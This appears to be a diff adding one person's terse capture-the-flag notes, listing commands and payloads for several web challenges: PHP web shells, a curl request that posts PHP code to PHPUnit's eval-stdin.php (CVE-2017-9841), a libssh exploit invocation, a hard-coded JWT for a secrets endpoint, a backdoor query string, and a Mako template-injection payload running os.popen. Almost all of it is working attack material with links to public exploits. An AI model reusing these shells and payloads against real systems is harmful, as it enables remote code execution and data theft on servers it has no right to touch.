@@ -1,0 +1,41 @@
+BOLT
+<?php system("'whoami");?>
+<?php system($_GET['param']);?>
+cat /flag.txt
+
+php-unit
+(dirsearch)
+(find version-exploit)
+https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.md
+curl -x POST -d "<? system('cd /; ls')?>" url/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php > logs.html
+
+libssh
+nmap
+sudo service ssh start
+https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d 
+python cve-2018-1993.py url -p port -c "cd ../; cat flag"
+
+schematics
+---forms
+
+authorisation
+Accept: text/html
+Content-Type: application/json
+
+curl -X GET http://34.89.243.101:32678/secrets -H "Authorization:JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NzM1MjA4NTgsImlhdCI6MTY3MzUyMDU1OCwibmJmIjoxNjczNTIwNTU4LCJpZGVudGl0eSI6MX0.7cuqyjkvzfD-Q1hNTfWd757wCoG6AyC0utSH3KAp5uc"
+
+elasticsearch
+https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py
+
+nondiff-backdoor
+grep -r "shell_exec("
+http://34.159.99.169:31053/?welldone=knockknock&shazam=cat%20flag.php
+
+shark
+curl -i 
+https://0x1.gitlab.io/web-security/Server-Side-Template-Injection/#mako
+name=<%
+import os
+x=os.popen('cat flag').read()
+%>
+${x}
